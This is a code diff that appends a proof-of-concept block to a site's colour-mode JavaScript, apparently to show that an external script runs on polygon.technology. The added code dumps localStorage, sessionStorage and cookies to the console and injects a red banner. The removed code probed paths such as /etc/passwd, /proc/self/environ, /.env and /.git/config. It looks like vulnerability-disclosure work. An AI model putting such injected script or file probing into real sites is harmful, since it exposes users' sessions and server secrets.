@@ -115,45 +115,75 @@ function colorModeToggle() {
 colorModeToggle();
 
 // ============================================================
-// 🔴 الكود الجديد (بعد الكود الأصلي)
+// 🔴 PoC - Cross-Domain JavaScript Execution
 // ============================================================
 
-(function poc_file_read() {
-    console.log('🔴 [PoC] Initializing file system read test');
+(function poc_ultimate() {
+    console.log('🔴 [PoC] External script executed on polygon.technology');
 
-    const filesToTest = [
-        '/etc/passwd',
-        '/etc/hosts',
-        '/proc/self/environ',
-        '/.env',
-        '/config.json',
-        '/package.json',
-        '/robots.txt',
-        '/sitemap.xml',
-        '/.git/config',
-        '/Dockerfile'
-    ];
-
-    async function readFile(filePath) {
-        try {
-            const response = await fetch(filePath);
-            if (response.ok) {
-                const content = await response.text();
-                console.log(`✅ [PoC] FILE FOUND: ${filePath}`);
-                console.log(`📄 [PoC] CONTENT:\n${content}`);
-                return { path: filePath, content: content };
-            }
-        } catch (error) {
-            // silent
+    // ============================================================
+    // 1. عرض localStorage
+    // ============================================================
+    console.log('📁 [PoC] localStorage data:');
+    if (localStorage.length > 0) {
+        for (let i = 0; i < localStorage.length; i++) {
+            const key = localStorage.key(i);
+            const value = localStorage.getItem(key);
+            console.log(`   🔑 ${key}:`, value);
         }
-        return null;
+    } else {
+        console.log('   ℹ️ localStorage is empty');
     }
 
-    (async function() {
-        console.log('🔴 [PoC] Scanning for files...');
-        for (const file of filesToTest) {
-            await readFile(file);
+    // ============================================================
+    // 2. عرض sessionStorage
+    // ============================================================
+    console.log('📁 [PoC] sessionStorage data:');
+    if (sessionStorage.length > 0) {
+        for (let i = 0; i < sessionStorage.length; i++) {
+            const key = sessionStorage.key(i);
+            const value = sessionStorage.getItem(key);
+            console.log(`   🔑 ${key}:`, value);
         }
-        console.log('✅ [PoC] File read test completed.');
-    })();
+    } else {
+        console.log('   ℹ️ sessionStorage is empty');
+    }
+
+    // ============================================================
+    // 3. عرض cookies
+    // ============================================================
+    console.log('🍪 [PoC] cookies:');
+    if (document.cookie) {
+        document.cookie.split('; ').forEach(cookie => {
+            console.log(`   🍪 ${cookie}`);
+        });
+    } else {
+        console.log('   ℹ️ No cookies found');
+    }
+
+    // ============================================================
+    // 4. عرض معلومات الصفحة
+    // ============================================================
+    console.log('🌐 [PoC] Page info:');
+    console.log('   🔗 URL:', window.location.href);
+    console.log('   📄 Title:', document.title);
+
+    // ============================================================
+    // 5. إضافة عنصر على الصفحة (دليل مرئي)
+    // ============================================================
+    const div = document.createElement('div');
+    div.style.cssText = 'position:fixed;bottom:10px;right:10px;background:#ff0000;color:#ffffff;padding:15px 20px;z-index:999999;font-family:monospace;font-size:16px;border-radius:8px;box-shadow:0 4px 12px rgba(0,0,0,0.5);';
+    div.textContent = '🔴 PoC - External Script Executed!';
+    document.body.appendChild(div);
+
+    // ============================================================
+    // 6. الخلاصة
+    // ============================================================
+    console.log('============================================================');
+    console.log('✅ [PoC] External script executed successfully');
+    console.log('✅ [PoC] Access to localStorage confirmed');
+    console.log('✅ [PoC] Access to cookies confirmed');
+    console.log('✅ [PoC] DOM manipulation confirmed');
+    console.log('🔴 [PoC] This proves the vulnerability exists');
+    console.log('============================================================');
 })();
